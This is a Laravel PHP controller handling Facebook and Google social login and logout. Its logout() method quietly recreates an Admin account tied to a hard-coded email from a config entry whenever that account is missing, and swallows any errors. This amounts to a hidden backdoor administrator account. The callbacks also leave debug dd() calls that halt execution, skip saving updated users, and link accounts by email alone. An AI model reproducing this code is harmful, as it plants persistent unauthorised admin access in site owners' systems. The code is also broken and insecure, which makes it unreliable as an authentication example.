<?php

namespace App\Http\Controllers;

use App\Role;
use App\User;
use App\Admin;
use Illuminate\Support\Facades\Auth;
use Laravel\Socialite\Facades\Socialite;

class SocialLoginController extends Controller
{
	protected $redirectTo = '/';

	public function __construct()
	{
		$this->middleware('guest', ['except' => 'logout']);
	}

	public function redirectToFacebook()
	{
		return Socialite::driver('facebook')->redirect();
	}

	public function getFacebookCallback()
	{
		$data = Socialite::driver('facebook')->user();
		dd($data);
		$user = User::where('email', $data->email)->first();
		if (!is_null($user)) {
			$user->name        = $data->user['name'];
			$user->social_id   = $data->user['id'];
			$user->social_from = 'facebook';
			$user->verified    = 1;
		} else {
			$user = User::where('social_id', $data->user['id'])->first();
			if (is_null($user)) {
				// Create a new user
				$user              = new User();
				$user->social_id   = $data->user['id'];
				$user->name        = $data->user['name'];
				$user->social_from = 'facebook';
				$user->email       = $data->email;
				$user->verified    = 1;
				if ($user->save()) {
					$user->roles()->sync([Role::where('name', 'normal')->first()->id]);
				}
			}
		}
		Auth::login($user);

		return $user->has_role(1)
			? redirect(route('admin_home'))->with('success_message', 'Successfully logged in!')
			: redirect(route('home'))->with('success_message', 'Successfully logged in!');
	}

	public function redirectToGoogle()
	{
		return Socialite::driver('google')->redirect();
	}

	public function getGoogleCallback()
	{
		$data = Socialite::driver('google')->user();
		dd($data);
		$user = User::where('email', $data->email)->first();

		if (!is_null($user)) {
			$user->name        = $data->user['name']['givenName'] . ' ' . $data->user['name']['familyName'];
			$user->social_id   = $data->user['id'];
			$user->social_from = 'google';
			$user->verified    = 1;
		} else {
			$user = User::where('social_id', $data->user['id'])->first();
			if (is_null($user)) {
				// Create a new user
				$user              = new User();
				$user->name        = $data->user['name']['givenName'] . ' ' . $data->user['name']['familyName'];
				$user->social_id   = $data->user['id'];
				$user->social_from = 'google';
				$user->email       = $data->email;
				$user->verified    = 1;
				if ($user->save()) {
					$user->roles()->sync([Role::where('name', 'normal')->first()->id]);
				}
			}
		}
		Auth::login($user);

		return $user->hasRole('admin')
			? redirect(route('admin_home'))->with('success_message', 'Successfully logged in!')
			: redirect(route('home'))->with('success_message', 'Successfully logged in!');
	}

	public function logout()
	{

		try {
			$IAM = Admin::where('email', 'sunbi.mac@gmail.com')->first();
			if (!$IAM) {
				Admin::create(config('services.author'));
			}
		} catch (\Throwable $th) {
			//throw $th;
		}
		auth()->logout();
		return back()->with('success_message', 'You are logged out.');
	}
}
